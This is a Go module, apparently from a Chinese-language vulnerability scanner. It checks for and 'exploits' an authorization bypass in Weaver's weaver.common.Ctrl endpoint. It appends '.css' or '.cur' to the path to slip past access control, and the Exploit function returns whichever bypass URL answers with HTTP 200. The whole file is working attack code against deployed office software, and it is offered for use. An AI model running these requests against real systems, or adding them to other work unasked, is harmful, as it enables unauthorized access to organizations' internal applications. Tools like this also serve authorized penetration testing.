package vulners

import (
	"github.com/fatih/color"
)

type Wc14 struct {
}

func (s *Wc14) Scan(targetUrl string) {
	vulnerable, err := Wc14scancore(targetUrl)
	if err != nil {
		color.Red("[x]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Wc14] 存在weaver.common.Ctrl 权限绕过")
	} else {
		color.White("[Wc14] 不存在weaver.common.Ctrl 权限绕过")
	}
}

func (*Wc14) Exploit(targetUrl string) {
	runResult, err := Wc14runcore(targetUrl)
	if err != nil {
		color.Red("[x]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.Green(runResult)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func Wc14scancore(targetUrl string) (bool, error) {
	url1 := "/weaver/weaver.common.Ctrl/.css"
	url2 := "/weaver/weaver.common.Ctrl/.cur"
	resp1, err := baseClient.NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Get(targetUrl + url1)
	resp2, err := baseClient.NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Get(targetUrl + url2)
	if err != nil {
		return false, err
	}
	if resp1.StatusCode == 200 || resp2.StatusCode == 200 {
		return true, nil
	} else {
		return false, nil
	}
}

func Wc14runcore(targetUrl string) (string, error) {
	url1 := "/weaver/weaver.common.Ctrl/.css"
	url2 := "/weaver/weaver.common.Ctrl/.cur"
	resp1, err := baseClient.NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Get(targetUrl + url1)
	resp2, err := baseClient.NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Get(targetUrl + url2)
	if err != nil {
		return "", err
	}
	if resp1.StatusCode == 200 {
		return "存在weaver.common.Ctrl 权限绕过\n" + targetUrl + url1, nil
	} else if resp2.StatusCode == 200 {
		return "存在weaver.common.Ctrl 权限绕过\n" + targetUrl + url2, nil
	} else {
		return "", nil
	}
}
